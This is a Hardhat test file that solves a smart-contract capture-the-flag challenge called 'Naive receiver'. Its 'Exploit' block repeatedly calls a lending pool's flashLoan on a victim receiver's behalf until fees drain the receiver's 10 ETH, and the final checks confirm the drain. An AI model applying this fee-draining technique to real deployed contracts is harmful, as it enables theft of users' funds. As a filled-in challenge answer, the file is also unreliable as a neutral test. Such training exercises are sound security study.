import { ethers } from "hardhat";
import { expect } from "chai";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { FlashLoanReceiver, NaiveReceiverLenderPool } from "../../typechain";

describe("[Challenge] Naive receiver", function () {
	let deployer: SignerWithAddress, user: SignerWithAddress, attacker: SignerWithAddress;
	let pool: NaiveReceiverLenderPool, receiver: FlashLoanReceiver;

	// Pool has 1000 ETH in balance
	const ETHER_IN_POOL = ethers.utils.parseEther("1000");

	// Receiver has 10 ETH in balance
	const ETHER_IN_RECEIVER = ethers.utils.parseEther("10");

	before(async function () {
		/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
		[deployer, user, attacker] = await ethers.getSigners();

		const LenderPoolFactory = await ethers.getContractFactory("NaiveReceiverLenderPool", deployer);
		const FlashLoanReceiverFactory = await ethers.getContractFactory("FlashLoanReceiver", deployer);

		pool = await LenderPoolFactory.deploy();
		await deployer.sendTransaction({ to: pool.address, value: ETHER_IN_POOL });

		expect(await ethers.provider.getBalance(pool.address)).to.be.equal(ETHER_IN_POOL);
		expect(await pool.fixedFee()).to.be.equal(ethers.utils.parseEther("1"));

		receiver = await FlashLoanReceiverFactory.deploy(pool.address);
		await deployer.sendTransaction({ to: receiver.address, value: ETHER_IN_RECEIVER });

		expect(await ethers.provider.getBalance(receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
	});

	it("Exploit", async function () {
		/** CODE YOUR EXPLOIT HERE */
		let bal = await ethers.provider.getBalance(receiver.address);

		while (bal.gt(0)) {
			await pool.flashLoan(receiver.address, ETHER_IN_POOL);
			bal = await ethers.provider.getBalance(receiver.address);
		}
	});

	after(async function () {
		/** SUCCESS CONDITIONS */

		// All ETH has been drained from the receiver
		expect(await ethers.provider.getBalance(receiver.address)).to.be.equal("0");
		expect(await ethers.provider.getBalance(pool.address)).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
	});
});
